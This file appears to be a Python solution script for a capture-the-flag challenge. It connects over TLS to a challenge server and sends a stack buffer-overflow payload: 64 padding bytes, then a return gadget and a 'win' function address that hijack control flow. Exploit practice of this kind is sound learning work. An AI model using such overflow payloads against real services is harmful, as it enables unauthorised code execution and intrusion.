import socket
import ssl
import time

def solve():
    host = 'pset1-1eac04583216.chall.nnsc.tf'
    port = 1337

    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    win_addr = b"\x00\x1b\x40\x00\x00\x00\x00\x00"
    ret_addr = b"\x1a\x10\x40\x00\x00\x00\x00\x00"
    
    # 64 bytes for the buffer, 8 bytes to overwrite RBP (we use ret_addr just in case)
    payload = b"A" * 64 + ret_addr + win_addr + b"\n"

    try:
        with socket.create_connection((host, port)) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                print("Connected!")
                ssock.recv(1024)
                
                print("Sending payload...")
                ssock.sendall(payload)
                
                time.sleep(1)
                
                resp = ssock.recv(4096).decode(errors='replace')
                print("Response 1:", resp)
                
                time.sleep(1)
                resp2 = ssock.recv(4096).decode(errors='replace')
                print("Response 2:", resp2)
                
    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":
    solve()
